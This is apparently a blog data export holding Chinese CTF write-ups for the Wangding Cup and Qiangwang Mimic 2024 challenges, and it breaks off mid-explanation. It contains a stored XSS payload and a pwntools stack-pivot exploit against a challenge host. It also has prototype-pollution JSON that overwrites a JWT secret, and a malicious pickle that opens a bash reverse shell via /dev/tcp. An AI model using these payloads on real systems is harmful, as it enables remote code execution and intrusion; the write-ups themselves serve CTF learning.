{"meta":{"title":"Hello!","subtitle":"","description":"","author":"John Doe","url":"https://m1racle-7.github.io","root":"/"},"pages":[{"title":"朋友","date":"2024-10-11T02:11:49.633Z","updated":"2024-10-11T02:11:49.633Z","comments":true,"path":"PY.html","permalink":"https://m1racle-7.github.io/PY.html","excerpt":"","text":"友链"},{"title":"文章归档","date":"2024-10-01T02:30:34.869Z","updated":"2024-10-01T02:29:55.280Z","comments":true,"path":"archive.html","permalink":"https://m1racle-7.github.io/archive.html","excerpt":"","text":""}],"posts":[{"title":"网鼎杯-青龙组WP","slug":"网鼎杯-青龙组-WriteUp","date":"2024-10-30T10:34:13.126Z","updated":"2024-10-30T11:21:28.247Z","comments":true,"path":"2024/10/30/网鼎杯-青龙组-WriteUp/","permalink":"https://m1racle-7.github.io/2024/10/30/%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99%E7%BB%84-WriteUp/","excerpt":"","text":"WEBWEB02：访问该环境，登陆注册能随便登，会返回一个&#x2F;content&#x2F;hash作为路由，然后拿dirsearch扫一下只能发现一个flag路由，回显你是boss嘛？就想看其他无人机拟定执行任务？ 进这个路由之后有3按钮，提交，刷新，和更新，一开始一直在试拿fenjing梭ssti，然后不成功 之后尝试写xss，发现存在存储型xss，之后尝试拿hackbar的xss一把梭一下，想弹到ceye.io上，咋弹都回显那个不是boss，我还以为是payload有问题，以为是要弹到当前路由md 之后看响应包，突然发现他的提交是点击提交当前页面，boss会审核你的起飞任务清单，所以使用submit提交后，就是直接boss审核的 所以最后是需要我们把xss payload存储之后，点击submit，就是由boss提交的，然后就能把flag路由的回显输出到当前页面了 1&lt;script&gt; fetch(&#x27;/flag&#x27;) .then(response =&gt; response.text()) .then(flagContent =&gt; &#123; fetch(&#x27;/content/2f9f1f36782a270b689d8c0f3e9e08df&#x27;, &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27; &#125;, body: `content=$&#123;encodeURIComponent(flagContent)&#125;` &#125;); &#125;); &lt;/script&gt; PWNPWN02首先是一个login的登录绕过，直接按照它的要求输就好了 然后过到下面的vuln函数中去打溢出，这边眼瞅着的长度肯定不够，首先想到打栈迁移,给出后续地址之后直接打 然后看到有给出完整后门，那么就好打了 直接栈迁移打system 123456789101112131415161718192021from pwn import *context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)libc=ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)elf=ELF(&#x27;./pwn&#x27;)#io=process(&quot;./pwn&quot;)io=remote(&quot;0192d6192424783193117245846d79b9.8nz7.dg02.ciihw.cn&quot;,44958)sh_address=0x0804A038ret_address=0x08048674io.recvuntil(&quot;Enter your username: &quot;)io.sendline(b&#x27;admin\\x00&#x27;)io.recvuntil(&quot;Enter your password: &quot;)io.sendline(b&#x27;admin123\\x00&#x27;)io.recvuntil(b&quot;0x&quot;)stac = int(io.recv(8),16)print(hex(stac))payload = (p32(0x080485E6)+p32(0)+p32(sh_address)).ljust(80,b&quot;\\x00&quot;)+p32(stac-4)+p32(ret_address)io.sendlineafter(&quot;plz input your msg:\\n&quot;,payload)io.interactive() REVERSEREVERSE01安卓题，有混淆，先找MainActivity，锁定主要逻辑如下 主要就是跟其中的check方法，发现是native层加密逻辑 那么直接解包apk去看逻辑，逻辑也相对清晰，主要加密逻辑有点眼熟，过一下gpt得知确实是sm4 那么直接找key嗦一把试试 注意后面的这个Z0099864的赋值有个端序问题，做一个倒序就好 123data=&quot;Z0099864&quot;print(data[::-1])#4689900Z 拼接起来之后把密文提取出来直接解SM4，跟进变量提取密文 最终解出flag REVERSE02逻辑什么的都相当清楚了，然后结合题目给的信息，顾名思义四段加密 第一段是乘以2 第二段是异或 第三段是自定义码表的一个base64 第四段是解一个AES EXP： 其中第三段解base64的结果为 12345678910111213141516171819202122232425262728293031s2=[0x70,0xCC,0x62,0xCA,0x60,0x6E,0x6C,0x6C]print(&quot;part1:&quot;,end=&#x27;&#x27;)for i in range(len(s2)): print(chr(round(s2[i]/2)),end=&#x27;&#x27;)# #part1:81fe0766data=[0x69,0x56,0x45,0x17,0x7D,0x0D,0x11,0x52]xor_key=&quot;XorrLord&quot;print(&quot;\\npart2:&quot;,end=&#x27;&#x27;)for i in range(len(xor_key)): print(chr(data[i]^ord(xor_key[i])),end=&#x27;&#x27;)#part2:197e1bc6#part3:809832f4from Crypto.Cipher import AESkey = b&quot;AesMasterAesMast&quot; cipher = AES.new(key, AES.MODE_ECB)v4 = bytes([251, 217, 179, 171, 217, 136, 230, 11, 147, 124, 149, 235, 148, 219, 11, 84])# 使用 AES ECB 模式解密 v4decrypted_data = cipher.decrypt(v4)print(&quot;\\npart4:&quot;, decrypted_data)#par4:d346fe66 拼接起来得到最终的flag为wdflag&#123;81fe0766197e1bc6809832f4d346fe66&#125; CRYPTOCRYPTO02直接上网搜索，找到原题 https://www.cnblogs.com/mumuhhh/p/17789591.html 根据给出的脚本进行解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329import timetime.clock = time.time debug = True strict = False helpful_only = Truedimension_min = 7 # 如果晶格达到该尺寸，则停止移除# 显示有用矢量的统计数据def helpful_vectors(BB, modulus): nothelpful = 0 for ii in range(BB.dimensions()[0]): if BB[ii,ii] &gt;= modulus: nothelpful += 1 print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)# 显示带有 0 和 X 的矩阵def matrix_overview(BB, bound): for ii in range(BB.dimensions()[0]): a = (&#x27;%02d &#x27; % ii) for jj in range(BB.dimensions()[1]): a += &#x27;0&#x27; if BB[ii,jj] == 0 else &#x27;X&#x27; if BB.dimensions()[0] &lt; 60: a += &#x27; &#x27; if BB[ii, ii] &gt;= bound: a += &#x27;~&#x27; #print (a)# 尝试删除无用的向量# 从当前 = n-1（最后一个向量）开始def remove_unhelpful(BB, monomials, bound, current): # 我们从当前 = n-1（最后一个向量）开始 if current == -1 or BB.dimensions()[0] &lt;= dimension_min: return BB # 开始从后面检查 for ii in range(current, -1, -1): # 如果它没有用 if BB[ii, ii] &gt;= bound: affected_vectors = 0 affected_vector_index = 0 # 让我们检查它是否影响其他向量 for jj in range(ii + 1, BB.dimensions()[0]): # 如果另一个向量受到影响： # 我们增加计数 if BB[jj, ii] != 0: affected_vectors += 1 affected_vector_index = jj # 等级：0 # 如果没有其他载体最终受到影响 # 我们删除它 if affected_vectors == 0: #print (&quot;* removing unhelpful vector&quot;, ii) BB = BB.delete_columns([ii]) BB = BB.delete_rows([ii]) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # 等级：1 #如果只有一个受到影响，我们会检查 # 如果它正在影响别的向量 elif affected_vectors == 1: affected_deeper = True for kk in range(affected_vector_index + 1, BB.dimensions()[0]): # 如果它影响哪怕一个向量 # 我们放弃这个 if BB[kk, affected_vector_index] != 0: affected_deeper = False # 如果没有其他向量受到影响，则将其删除，并且 # 这个有用的向量不够有用 #与我们无用的相比 if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]): #print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index) BB = BB.delete_columns([affected_vector_index, ii]) BB = BB.delete_rows([affected_vector_index, ii]) monomials.pop(affected_vector_index) monomials.pop(ii) BB = remove_unhelpful(BB, monomials, bound, ii-1) return BB # nothing happened return BB &quot;&quot;&quot; Returns:* 0,0 if it fails* -1，-1 如果 &quot;strict=true&quot;，并且行列式不受约束* x0,y0 the solutions of `pol`&quot;&quot;&quot;def boneh_durfee(pol, modulus, mm, tt, XX, YY): &quot;&quot;&quot; Boneh and Durfee revisited by Herrmann and May 在以下情况下找到解决方案：* d &lt; N^delta* |x|&lt; e^delta* |y|&lt; e^0.5每当 delta &lt; 1 - sqrt（2）/2 ~ 0.292 &quot;&quot;&quot; # substitution (Herrman and May) PR.&lt;u, x, y&gt; = PolynomialRing(ZZ) #多项式环 Q = PR.quotient(x*y + 1 - u) # u = xy + 1 polZ = Q(pol).lift() UU = XX*YY + 1 # x-移位 gg = [] for kk in range(mm + 1): for ii in range(mm - kk + 1): xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk gg.append(xshift) gg.sort() # 单项式 x 移位列表 monomials = [] for polynomial in gg: for monomial in polynomial.monomials(): #对于多项式中的单项式。单项式（）： if monomial not in monomials: # 如果单项不在单项中 monomials.append(monomial) monomials.sort() # y-移位 for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk) yshift = Q(yshift).lift() gg.append(yshift) # substitution # 单项式 y 移位列表 for jj in range(1, tt + 1): for kk in range(floor(mm/tt) * jj, mm + 1): monomials.append(u^kk * y^jj) # 构造格 B nn = len(monomials) BB = Matrix(ZZ, nn) for ii in range(nn): BB[ii, 0] = gg[ii](0, 0, 0) for jj in range(1, ii + 1): if monomials[jj] in gg[ii].monomials(): BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY) #约化格的原型 if helpful_only: # #自动删除 BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1) # 重置维度 nn = BB.dimensions()[0] if nn == 0: print (&quot;failure&quot;) return 0,0 # 检查向量是否有帮助 if debug: helpful_vectors(BB, modulus^mm) # 检查行列式是否正确界定 det = BB.det() bound = modulus^(mm*nn) if det &gt;= bound: print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;) print (&quot;Try with highers m and t.&quot;) if debug: diff = (log(det) - log(bound)) / log(2) print (&quot;size det(L) - size e^(m*n) = &quot;, floor(diff)) if strict: return -1, -1 else: print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;) # display the lattice basis if debug: matrix_overview(BB, modulus^mm) # LLL if debug: print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;) #BB = BB.BKZ(block_size=25) BB = BB.LLL() if debug: print (&quot;LLL is done!&quot;) # 替换向量 i 和 j -&gt;多项式 1 和 2 if debug: print (&quot;在格中寻找线性无关向量&quot;) found_polynomials = False for pol1_idx in range(nn - 1): for pol2_idx in range(pol1_idx + 1, nn): # 对于i and j, 构造两个多项式 PR.&lt;w,z&gt; = PolynomialRing(ZZ) pol1 = pol2 = 0 for jj in range(nn): pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY) pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY) # 结果 PR.&lt;q&gt; = PolynomialRing(ZZ) rr = pol1.resultant(pol2) if rr.is_zero() or rr.monomials() == [1]: continue else: print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx) found_polynomials = True break if found_polynomials: break if not found_polynomials: print (&quot;no independant vectors could be found. This should very rarely happen...&quot;) return 0, 0 rr = rr(q, q) # solutions soly = rr.roots() if len(soly) == 0: print (&quot;Your prediction (delta) is too small&quot;) return 0, 0 soly = soly[0][0] ss = pol1(q, soly) solx = ss.roots()[0][0] return solx, soly def example(): ############################################ # 随机生成数据 ########################################## #start_time =time.perf_counter start =time.clock() size=512 length_N = 2*size; ss=0 s=70; M=1 # the number of experiments delta = 299/1024 # p = random_prime(2^512,2^511) for i in range(M):# p = random_prime(2^size,None,2^(size-1))# q = random_prime(2^size,None,2^(size-1))# if(p&lt;q):# temp=p# p=q# q=temp N = 69207225407236621802315929835231678761546030648552499878532449478584182354765750349071726491300234635799981022731725455349420914234822062855723904939138000102040435210706843712478106458961468791872716857992483073814316706027260218386995042614451566024972455009936823034721213885693157803402838690192435869721 e = 28439197921283357831697812537770489393495780585893113255835906777860388696994349687910509232020125501124985537099309478678733953591875352794038209770419925216539701941346792691704315717440469781000758533118851176304883130375842134875219545766782891367082825940026559693057872966937790726617783138946733512771 c = 22634701644450101524194718626550730546669791908217195025458791096208664618277869132516992188391372685210476489439282043033169958992171845152117468239445520601245104073454741171223045094363461153069787573765111331214431209598625611554915848071794889073522221012875111880946316417640573688399584093700714982302 hint1 = 654543761191063613807 # p高位 hint2 = 819778612327847774041 # q高位# print (&quot;p真实高&quot;,s,&quot;比特：&quot;, int(p/2^(512-s)))# print (&quot;q真实高&quot;,s,&quot;比特：&quot;, int(q/2^(512-s))) # N = p*q; # 解密指数d的指数( 最大0.292) m = 7 # 格大小（越大越好/越慢） t = round(((1-2*delta) * m)) # 来自 Herrmann 和 May 的优化 X = floor(N^delta) # Y = floor(N^(1/2)/2^s) # 如果 p、 q 大小相同，则正确 for l in range(int(hint1),int(hint1)+1): print(&#x27;\\n\\n\\n l=&#x27;,l) pM=l; p0=pM*2^(size-s)+2^(size-s)-1; q0=N/p0; qM=int(q0/2^(size-s)) A = N + 1-pM*2^(size-s)-qM*2^(size-s); #A = N+1 P.&lt;x,y&gt; = PolynomialRing(ZZ) pol = 1 + x * (A + y) #构建的方程 # Checking bounds #if debug: #print (&quot;=== 核对数据 ===&quot;) #print (&quot;* delta:&quot;, delta) #print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292) #print (&quot;* size of e:&quot;, ceil(log(e)/log(2))) # e的bit数 # print (&quot;* size of N:&quot;, len(bin(N))) # N的bit数 #print (&quot;* size of N:&quot;, ceil(log(N)/log(2))) # N的bit数 #print (&quot;* m:&quot;, m, &quot;, t:&quot;, t) # boneh_durfee if debug: ##print (&quot;=== running algorithm ===&quot;) start_time = time.time() solx, soly = boneh_durfee(pol, e, m, t, X, Y) if solx &gt; 0: #print (&quot;=== solution found ===&quot;) if False: print (&quot;x:&quot;, solx) print (&quot;y:&quot;, soly) d_sol = int(pol(solx, soly) / e) ss=ss+1 print (&quot;=== solution found ===&quot;) print (&quot;p的高比特为：&quot;,l) print (&quot;q的高比特为：&quot;,qM) print (&quot;d=&quot;,d_sol) if debug: print(&quot;=== %s seconds ===&quot; % (time.time() - start_time)) #break print(&quot;ss=&quot;,ss) #end=time.process_time end=time.clock() print(&#x27;Running time: %s Seconds&#x27;%(end-start))if __name__ == &quot;__main__&quot;: example() 跑第二个脚本，得到flag wdflag{31998a91-fd51-4df2-864e-73c122786868} CRYPTO02下载附件，打开代码，问豆包 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# 首先，根据椭圆曲线签名的性质，利用给定的r1, s1, z1, r2, s2, z2恢复dAfrom Crypto.Util.number import long_to_bytesfrom hashlib import sha256from sympy import nextprimeimport gmpy2import binasciifrom Crypto.Cipher import AESfrom Crypto.Util.Padding import unpad# 已知的参数r1 = 66378485426889535028763915423685212583706810153195012097516816885575964878246r2 = 66378485426889535028763915423685212583706810153195012097516816885575964878246s1 = 73636354334739290806716081380360143742414582638332132893041295586890856253300s2 = 64320109990895398581134015047131652648423777800538748939578192006599226954034z1 = 35311306706233977395060423051262119784421232920823462737043282589337379493964z2 = 101807556569342254666094290602497540565936025601030395061064067677254735341454p = 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffefffffc2fn = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141# 根据椭圆曲线签名的恢复公式# s1 * k - z1 = r1 * dA (mod n)# s2 * k - z2 = r2 * dA (mod n)# 由于r1 = r2，可以通过联立方程求解dAk = gmpy2.invert(s1 - s2, n) * (z1 - z2) % ndA = gmpy2.invert(r1, n) * (s1 * k - z1) % n# 使用恢复的dA生成AES密钥key = sha256(long_to_bytes(dA)).digest()# 已知的加密后的flag十六进制字符串encrypted_flag_hex = &#x27;3cdbe372c9bc279e816336ad69b8247f4ec05647a7e97285dd64136875004b638b77191fe9bef702cb873ee93dbe376c050d0c721b69f17f539cff83372cc37b&#x27;encrypted_flag_bytes = binascii.unhexlify(encrypted_flag_hex)# 提取IV和密文iv = encrypted_flag_bytes[:AES.block_size]ciphertext = encrypted_flag_bytes[AES.block_size:]# 创建AES解密对象cipher = AES.new(key, AES.MODE_CBC, iv)# 解密decrypted_data = cipher.decrypt(ciphertext)# 去除填充plaintext = unpad(decrypted_data, AES.block_size)# 对替换加密的逆过程（victory_encrypt的逆）victory_key = &quot;WANGDINGCUP&quot;key_length = len(victory_key)decrypted_text = &quot;&quot;for i, char in enumerate(plaintext.decode().upper()): if char.isalpha(): shift = ord(victory_key[i % key_length]) - ord(&#x27;A&#x27;) decrypted_char = chr((ord(char) - ord(&#x27;A&#x27;) - shift + 26) % 26 + ord(&#x27;A&#x27;)) decrypted_text += decrypted_char else: decrypted_text += charprint(decrypted_text) 运行后成功获取到flag，要转小写 MISCMISC01下载附件看题目描述 拿wireshark看 md5加密 最后得到flag wdflag{bd9bfee6c7303048dab68cfa6a14b5e7} MISC03找攻击IP 攻击IP为：39.168.5.60 MISC04给了一个这个抽象图片，蓝底红线，凭直觉一个是需要还原成二维码的形式 根据题干，他是有一个图像加密算法，需要把这个红线还原重组成二维码，搜索一个是这个Peano曲线 最终找到了一个irisctf的一道赛题The Peano Scramble https://almostgph.github.io/2024/01/08/IrisCTF2024/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from PIL import Imagefrom tqdm import tqdmdef peano(n): if n == 0: return [[0,0]] else: in_lst = peano(n - 1) lst = in_lst.copy() px,py = lst[-1] lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + 1 + i[0], py - i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px - i[0], py - 1 - i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + i[0], py - 1 - i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + 1 + i[0], py + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px - i[0], py + 1 + i[1]] for i in in_lst) px,py = lst[-1] lst.extend([px + i[0], py + 1 + i[1]] for i in in_lst) return lstorder = peano(6)img = Image.open(r&quot;./1.png&quot;)width, height = img.sizeblock_width = width # // 3block_height = height # // 3new_image = Image.new(&quot;RGB&quot;, (width, height))for i, (x, y) in tqdm(enumerate(order)): # 根据列表顺序获取新的坐标 new_x, new_y = i % width, i // width # 获取原图像素 pixel = img.getpixel((x, height - 1 - y)) # 在新图像中放置像素 new_image.putpixel((new_x, new_y), pixel)new_image.save(&quot;rearranged_image.jpg&quot;) 扫码即可","categories":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://m1racle-7.github.io/tags/CTF/"}]},{"title":"2024强网拟态WP-- by MYGO!!!","slug":"2024强网拟态WP","date":"2024-10-21T01:18:03.121Z","updated":"2024-10-30T11:21:05.634Z","comments":true,"path":"2024/10/21/2024强网拟态WP/","permalink":"https://m1racle-7.github.io/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/","excerpt":"","text":"Webcapoo 一血爽喽 f12发现读的图片，感觉应该能任意文件读取，读一下&#x2F;etc&#x2F;passwd 发现能读，再看一下环境变量&#x2F;proc&#x2F;1&#x2F;environ,没有 再看一下&#x2F;proc&#x2F;1&#x2F;cmdline，发现存在&#x2F;bin&#x2F;sh&#x2F;docker-entrypoint.sh 再尝试一下start.sh 找到flag名称，直接读就能出flag ez_picker源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156from sanic import Sanicfrom sanic.response import json, file as file_, text, redirectfrom sanic_cors import CORSfrom key import secret_keyimport osimport pickleimport timeimport jwtimport ioimport builtinsapp = Sanic(&quot;App&quot;)pickle_file = &quot;data.pkl&quot;my_object = &#123;&#125;users = []safe_modules = &#123; &#x27;math&#x27;, &#x27;datetime&#x27;, &#x27;json&#x27;, &#x27;collections&#x27;,&#125;safe_names = &#123; &#x27;sqrt&#x27;, &#x27;pow&#x27;, &#x27;sin&#x27;, &#x27;cos&#x27;, &#x27;tan&#x27;, &#x27;date&#x27;, &#x27;datetime&#x27;, &#x27;timedelta&#x27;, &#x27;timezone&#x27;, &#x27;loads&#x27;, &#x27;dumps&#x27;, &#x27;namedtuple&#x27;, &#x27;deque&#x27;, &#x27;Counter&#x27;, &#x27;defaultdict&#x27;&#125;class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in safe_modules and name in safe_names: return getattr(builtins, name) raise pickle.UnpicklingError(&quot;global &#x27;%s.%s&#x27; is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()CORS(app, supports_credentials=True, origins=[&quot;http://localhost:8000&quot;, &quot;http://127.0.0.1:8000&quot;])class User: def __init__(self, username, password): self.username = username self.password = passworddef merge(src, dst): for k, v in src.items(): if hasattr(dst, &#x27;__getitem__&#x27;): if dst.get(k) and type(v) == dict: merge(v, dst.get(k)) else: dst[k] = v elif hasattr(dst, k) and type(v) == dict: merge(v, getattr(dst, k)) else: setattr(dst, k, v)def token_required(func): async def wrapper(request, *args, **kwargs): token = request.cookies.get(&quot;token&quot;) if not token: return redirect(&#x27;/login&#x27;) try: result = jwt.decode(token, str(secret_key), algorithms=[&#x27;HS256&#x27;], options=&#123;&quot;verify_signature&quot;: True&#125;) except jwt.ExpiredSignatureError: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Token expired&quot;&#125;, status=401) except jwt.InvalidTokenError: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid token&quot;&#125;, status=401) print(result) if result[&quot;role&quot;] != &quot;admin&quot;: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Permission Denied&quot;&#125;, status=401) return await func(request, *args, **kwargs) return wrapper@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;])def file_reader(request): file = &quot;app.py&quot; with open(file, &#x27;r&#x27;) as f: content = f.read() return text(content)@app.route(&#x27;/upload&#x27;, methods=[&quot;GET&quot;, &quot;POST&quot;])@token_requiredasync def upload(request): if request.method == &quot;GET&quot;: return await file_(&#x27;templates/upload.html&#x27;) if not request.files: return text(&quot;No file provided&quot;, status=400) file = request.files.get(&#x27;file&#x27;) file_object = file[0] if isinstance(file, list) else file try: new_data = restricted_loads(file_object.body) try: my_object.update(new_data) except: return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Pickle object loaded but not updated&quot;&#125;) with open(pickle_file, &quot;wb&quot;) as f: pickle.dump(my_object, f) return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Pickle object updated&quot;&#125;) except pickle.UnpicklingError: return text(&quot;Dangerous pickle file&quot;, status=400)@app.route(&#x27;/register&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def register(request): if request.method == &#x27;GET&#x27;: return await file_(&#x27;templates/register.html&#x27;) if request.json: NewUser = User(&quot;username&quot;, &quot;password&quot;) merge(request.json, NewUser) users.append(NewUser) else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;, status=400) return json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;message&quot;: &quot;Register Success!&quot;, &quot;redirect&quot;: &quot;/login&quot;&#125;)@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])async def login(request): if request.method == &#x27;GET&#x27;: return await file_(&#x27;templates/login.html&#x27;) if request.json: username = request.json.get(&quot;username&quot;) password = request.json.get(&quot;password&quot;) if not username or not password: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Username or password missing&quot;&#125;, status=400) user = next((u for u in users if u.username == username), None) if user: if user.password == password: data = &#123;&quot;user&quot;: username, &quot;role&quot;: &quot;guest&quot;&#125; data[&#x27;exp&#x27;] = int(time.time()) + 60 * 5 token = jwt.encode(data, str(secret_key), algorithm=&#x27;HS256&#x27;) response = json(&#123;&quot;status&quot;: &quot;success&quot;, &quot;redirect&quot;: &quot;/upload&quot;&#125;) response.cookies[&quot;token&quot;] = token response.headers[&#x27;Access-Control-Allow-Origin&#x27;] = request.headers.get(&#x27;origin&#x27;) return response else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid password&quot;&#125;, status=400) else: return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;User not found&quot;&#125;, status=404) return json(&#123;&quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Invalid request&quot;&#125;, status=400)if __name__ == &#x27;__main__&#x27;: app.run(host=&quot;0.0.0.0&quot;, port=8000) 题目给了源码, 存在merge,并且User类有__init__,一眼原型链污染,可以污染到global全局变量 存在RestrictedUnpickler并重写了find_class,可以绕过来pickle反序列化 ​ 所以这道题思路就是先利用原型链污染来污染secret_key伪造admin,再污染safe_modules和safe_names来绕过RestrictedUnpickler限制即可. 源码中/register路由可以进行原型链污染 在/upload路由可以上传pkl文件来触发pickle反序列化. 所以直接先传 1234567&#123; &quot;__init__&quot;: &#123; &quot;__globals__&quot;: &#123; &quot;secret_key&quot;: &quot;123456&quot; &#125; &#125;&#125; 污染secret_key 之后jwt伪造 再污染 123456789101112131415&#123; &quot;__init__&quot; : &#123; &quot;__globals__&quot; : &#123; &quot;safe_names&quot; :[&quot;getattr&quot;,&quot;system&quot;,&quot;dict&quot;,&quot;globals&quot;] &#125; &#125;&#125;和&#123; &quot;__init__&quot; : &#123; &quot;__globals__&quot; : &#123; &quot;safe_modules&quot; : &quot;builtins&quot; &#125; &#125;&#125; 之后根据博客里面绕过builtins的例子写payload 12345678910111213141516171819202122import pickledata=&#x27;&#x27;&#x27;cbuiltinsgetattr(cbuiltinsdictS&#x27;get&#x27;tR(cbuiltinsglobals(tRS&#x27;builtins&#x27;tRp1cbuiltinsgetattr(g1S&#x27;eval&#x27;tR(S&#x27;__import__(&quot;os&quot;).system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1&#x27;&quot;)&#x27;tR.&#x27;&#x27;&#x27;.encode()with open(&#x27;dddd.pkl&#x27;, &#x27;wb&#x27;) as f: f.write(data)print(f&quot;Type of &#x27;data&#x27;: &#123;type(data)&#125;&quot;)print(f&quot;Module of &#x27;data&#x27;: &#123;data.__module__ if hasattr(data, &#x27;__module__&#x27;) else &#x27;N/A&#x27;&#125;&quot;) 上传即可 PS:这shell弹的太慢了,我还以为环境死了差点关了…. Cryptoxor题目描述 12mimic is a keyword.0b050c0e180e585f5c52555c5544545c0a0f44535f0f5e445658595844050f5d0f0f55590c555e5a0914 直接给gpt,秒了 Miscezflag解压压缩包有个流量包,拿工具跑出来一个压缩包 解压后有个flag.zip,但是解压不出来,拿file看一下发现是一个png 之后改一下后缀即可得到flag pwnsignin revenge换题目libc环境 那道题目的时候，发现题目是直接跑不起来的。开始以为是沙箱的问题，还是太菜了。其实更换题目libc环境的问题 这里跟换一下题目的libc环境， 12patchelf --replace-needed libc.so.6 ./libc.so.6 vulnpatchelf --set-interpreter ./ld-linux-x86-64.so.2 vuln ldd vuln查看一下更换是否成功。 然后就可以正常运行了。 踩坑点：注意要把给定的libc文件进行授权。并且要在管理员模式下授权。 这里注意不换也行，正常打远程应该不影响做题，但是复现跑本地就会遇到麻烦了。但是如果是你是kali的话。把他俩放在同一文件下kali会自行匹配ld文件和libc文件 12345bbq@ubuntu:~/桌面/啊布拉布拉/11111$ ldd vuln linux-vdso.so.1 (0x00007fff6fb85000) ./libc.so.6 (0x00007fce115dc000) //---------------------------------------------&gt;&gt;&gt;ld文件 ./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fce117d0000)//-------&gt;&gt;&gt;libc文件bbq@ubuntu:~/桌面/啊布拉布拉/11111$ 先日常检查一下 12345678bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ checksec vuln[*] &#x27;/home/bbq/桌面/啊布拉布拉/11111/2222/vuln&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000)bbq@ubuntu:~/桌面/啊布拉布拉/11111/2222$ 正常的NX和got表可写 丢进ida里面看看 12345678910111213141516int __fastcall main(int argc, const char **argv, const char **envp)&#123; init(argc, argv, envp); sandbox(); puts(&quot;lets move and pwn!&quot;); vuln(); return 0;&#125;ssize_t vuln()&#123; char buf[256]; // [rsp+0h] [rbp-100h] BYREF return read(0, buf, 0x130uLL);&#125; 进去可以明显的看见一个沙箱函数和我们所要纯在漏洞的read函数 简单看一下沙箱函数 这里我问了一下gpt，其实大概我的理解就是提醒我们使用ORW ORW首先通过open函数向bss段上中写入b&#39;./flag\\x00\\x00&#39;，并将b&#39;./flag\\x00\\x00&#39;作为open函数的参数，构造open(b&#39;./flag\\x00\\x00&#39;)用来打开当前目录名为flag的文件，其中0表示只读方式打开。然后构造 read(3, name_addr, 0x50) 将 flag 内容写入到 name 的地址处，再通过构造 write(1, name_addr, 0x50) 将 flag 内容从 name 